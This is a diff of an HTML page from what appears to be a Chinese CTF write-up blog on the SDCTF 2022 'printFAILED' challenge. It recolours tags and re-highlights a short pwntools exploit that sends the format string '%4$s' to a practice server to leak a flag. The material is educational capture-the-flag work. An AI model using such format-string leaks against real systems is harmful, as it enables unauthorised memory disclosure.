@@ -223,12 +223,12 @@
       
       <span class="tag">
         
-        <a href="/tags/PWN/" style="color: #00a596; margin-right: 0.5rem;">PWN</a>
+        <a href="/tags/PWN/" style="color: #ff7d73; margin-right: 0.5rem;">PWN</a>
       </span>
       
       <span class="tag">
         
-        <a href="/tags/SDCTF/" style="color: #03a9f4; margin-right: 0.5rem;">SDCTF</a>
+        <a href="/tags/SDCTF/" style="color: #ffa2c4; margin-right: 0.5rem;">SDCTF</a>
       </span>
       
     </span>
@@ -263,7 +263,7 @@
 <p>这里我知识有限，看不出这是什么加密的，别人用按位运算sub来解码，直接可以得到flag</p>
 <p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/5.png"></p>
 <hr>
-<h2 id="exp如下"><span id="exp如下">exp如下：</span></h2><figure class="highlight gml"><table><tr><td class="code"><pre><span class="line">python复制编辑from pwn import *</span><br><span class="line"> </span><br><span class="line">#p = process(<span class="string">&#x27;./printFailed&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28789</span>)</span><br><span class="line"> </span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">&quot;%4$s&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"><span class="variable language_">x</span> = p.recvline()</span><br><span class="line"><span class="variable language_">y</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="variable language_">x</span>:</span><br><span class="line">        <span class="variable language_">y</span>+=<span class="built_in">chr</span>(i<span class="number">-1</span>)</span><br><span class="line">print(<span class="variable language_">y</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="exp如下"><span id="exp如下">exp如下：</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./printFailed&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28789</span>)</span><br><span class="line"> </span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">&quot;%4$s&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">x = p.recvline()</span><br><span class="line">y = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        y+=<span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h1 id="总结"><span id="总结">总结</span></h1><p>做这道格式化字符串漏洞的题，也算是给我开阔了自己的视野，还是要好好加强自己的能力，冲冲冲，干就完事了！！！</p>
